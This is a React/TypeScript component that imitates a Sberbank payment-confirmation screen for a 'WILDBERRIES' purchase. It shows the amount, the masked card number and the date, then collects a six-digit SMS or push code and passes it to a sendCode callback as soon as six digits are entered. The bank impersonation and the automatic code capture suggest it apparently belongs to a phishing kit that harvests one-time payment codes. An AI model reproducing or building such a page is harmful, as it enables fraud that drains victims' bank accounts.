import React, {useState, useEffect} from 'react'
import styles from './SberbankPush.module.scss'
import CountUp from 'react-countup';


type Card = {
    paymentSystem: string;
    cardNumber: string;
    bank: string;
    system: string
  }
interface Props{
    cardDetails: Card;
    totalPrice: number;
    sendCode: (value: string) => void;

}


const SberbankPush = ({totalPrice, cardDetails, sendCode}: Props) => {
    const [code, setCode] = useState('')
    let currentDate = new Date();
    let day = String(currentDate.getDate()).padStart(2, '0');
    let month = String(currentDate.getMonth() + 1).padStart(2, '0'); 
    let year = currentDate.getFullYear();
    let formattedDate = `${day}.${month}.${year}`;

    useEffect(() => {
      if(code.length === 6){
       sendCode(code)
      }
     }, [code, sendCode])

  return (
    <div className={styles.sberbankPushContainer}>
       <div className={styles.logo}>
       <img src={`https://mrbin.io/bins/logo/main/93c45296-5522-415c-b2dc-7a04fe2bf806/1.svg`} alt={`234`} className={styles.bankLogo}/>
       {cardDetails.system === 'mir' ? <img src="/images/MIRaccept.svg" alt="" className={styles.mirIcon}/> :  <img src={`https://mrbin.io/images/payment-systems/logo-${cardDetails.system}.svg`} alt="" className={styles.icon}/>}
        
    </div> 
    <div className={styles.price}> <CountUp end={totalPrice} duration={0.4} separator=" " /> ₽</div>
    <div className={`${styles.item} ${styles.store}`}><p>Магазин</p> <span>WILDBERRIES</span></div>
    <div className={`${styles.item} ${styles.cardNum}`}>
        <p>Номер карты</p> 
        <span>
          <i className="fa-solid fa-circle" style={{color: '#8f8f8f'}}></i>
          <i className="fa-solid fa-circle" style={{color: '#8f8f8f'}}></i>
           {cardDetails.cardNumber.slice(-4)}
        </span>
    </div>
    <div className={`${styles.item} ${styles.date}`}><p>Дата</p> <span>{formattedDate}</span></div>
      <div className={styles.sendedCode}>
        Отправили код
      </div>
      <div className={styles.sendedCodeMessage}>
        В СМС или Push-уведомлении. Чтобы получить его, ваш номер должен быть подключен к СМС-банку.
      </div>

      <div className={styles.codeInput}>
        <div className={styles.label}>Введите код для оплаты покупки</div>
        <input type="tel" name="code"  className={styles.codeInput} maxLength={6} onKeyPress={(e) => {
        if (!/[0-9]/.test(e.key)) {
            e.preventDefault();
        }
    }} value={code} onChange={(e)=>setCode(e.target.value)}/>
      </div>
      <div className={styles.paymentDescription}>
        Оплата покупок без комиссии. За пополнение карт и кошельков через приложение и сайты других банков взимается комиссия. Подтверждая операцию с помощью смс-кода, вы соглашаетесь с условиями и тарифами: <span>ссылка</span>
      </div>
    </div>
  )
}

export default SberbankPush
